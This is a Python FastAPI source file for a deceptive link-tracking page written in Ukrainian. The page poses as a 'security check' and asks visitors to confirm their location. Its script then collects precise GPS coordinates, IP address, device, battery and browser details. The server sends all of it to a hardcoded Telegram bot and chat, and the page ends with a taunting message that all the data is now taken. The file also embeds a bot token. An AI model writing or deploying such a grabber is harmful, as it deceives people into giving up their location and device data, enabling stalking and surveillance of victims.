from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests
import os

app = FastAPI()

BOT_TOKEN = "9210952034:AAGDvhDhLSN6WC_4MaSHpNb-5xL8s9dlMUY"
CHAT_ID = "1423489525"


@app.get("/", response_class=HTMLResponse)
async def index():
    return """
    <!DOCTYPE html>
    <html lang="uk">
    <head>
        <meta charset="UTF-8">
        <title>Перевірка безпеки</title>
        <style>
            body {
                background-color: #0f0f0f;
                color: #ffffff;
                font-family: monospace;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                text-align: center;
            }
            .btn {
                background-color: #00ff66;
                color: #000;
                border: none;
                padding: 15px 30px;
                font-size: 18px;
                font-weight: bold;
                cursor: pointer;
                border-radius: 8px;
                box-shadow: 0 0 15px rgba(0, 255, 102, 0.4);
            }
            h1 {
                font-size: 24px;
                color: #00ff66;
                text-shadow: 0 0 10px rgba(0, 255, 102, 0.5);
                display: none;
                padding: 20px;
            }
            p { color: #888; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div id="main-content">
            <p>Для продовження перегляду сайту необхідно підтвердити геопозицію</p>
            <button class="btn" onclick="requestGeo()">Отримати доступ</button>
        </div>
        <h1 id="secret-text">Упс, всі дані в мене, ти вже нічо не поробиш 😎</h1>

        <script>
            async function collectAndSend(lat = null, lon = null, accuracy = null) {
                let batteryLevel = "Невідомо", charging = "Невідомо";
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        batteryLevel = Math.round(battery.level * 100) + "%";
                        charging = battery.charging ? "Так 🔌" : "Ні 🔋";
                    }
                } catch (e) {}

                const data = {
                    lat: lat, lon: lon, accuracy: accuracy,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform || "Невідомо",
                    language: navigator.language || "Невідомо",
                    hardwareConcurrency: navigator.hardwareConcurrency || "Невідомо",
                    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Невідомо",
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: window.screen.colorDepth + " біт",
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    batteryLevel: batteryLevel, charging: charging,
                    touchPoints: navigator.maxTouchPoints || 0
                };

                await fetch('/save', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
            }

            function requestGeo() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            await collectAndSend(pos.coords.latitude, pos.coords.longitude, Math.round(pos.coords.accuracy));
                            showHackedScreen();
                        },
                        async () => {
                            await collectAndSend();
                            showHackedScreen();
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                } else {
                    showHackedScreen();
                }
            }

            function showHackedScreen() {
                document.getElementById('main-content').style.display = 'none';
                document.getElementById('secret-text').style.display = 'block';
            }
        </script>
    </body>
    </html>
    """


@app.post("/save")
async def save(request: Request):
    client_host = request.headers.get("x-forwarded-for", request.client.host)
    data = await request.json()

    lat, lon, acc = data.get("lat"), data.get("lon"), data.get("accuracy")

    text = (
        f"🚨 **Новий перехід за посиланням!**\n\n"
        f"🌐 **IP-адреса:** `{client_host}`\n"
        f"💻 **Платформа:** `{data.get('platform')}`\n"
        f"🧠 **Ядер процесора:** `{data.get('hardwareConcurrency')}`\n"
        f"💾 **Оперативна пам'ять (ОЗП):** `{data.get('deviceMemory')}`\n"
        f"🔋 **Заряд батареї:** `{data.get('batteryLevel')} (Заряджається: {data.get('charging')})`\n"
        f"🖥 **Роздільна здатність екрана:** `{data.get('screenResolution')}`\n"
        f"👆 **Точок торкання (сенсор):** `{data.get('touchPoints')}`\n"
        f"🌍 **Часовий пояс:** `{data.get('timezone')}`\n"
        f"🗣 **Мова браузера:** `{data.get('language')}`\n"
        f"🔍 **User-Agent:** `{data.get('userAgent')}`\n\n"
    )

    if lat and lon:
        text += (
            f"📍 **Точна геолокація:**\n"
            f"Координати: `{lat}, {lon}`\n"
            f"Похибка: ~{acc} м"
        )
    else:
        text += f"❌ Геолокацію заблоковано користувачем."

    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}"
    requests.post(
        f"{base_url}/sendMessage",
        data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"},
    )

    if lat and lon:
        requests.post(
            f"{base_url}/sendLocation",
            data={"chat_id": CHAT_ID, "latitude": lat, "longitude": lon},
        )

    return {"status": "ok"}


if __name__ == "__main__":
    import uvicorn

    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
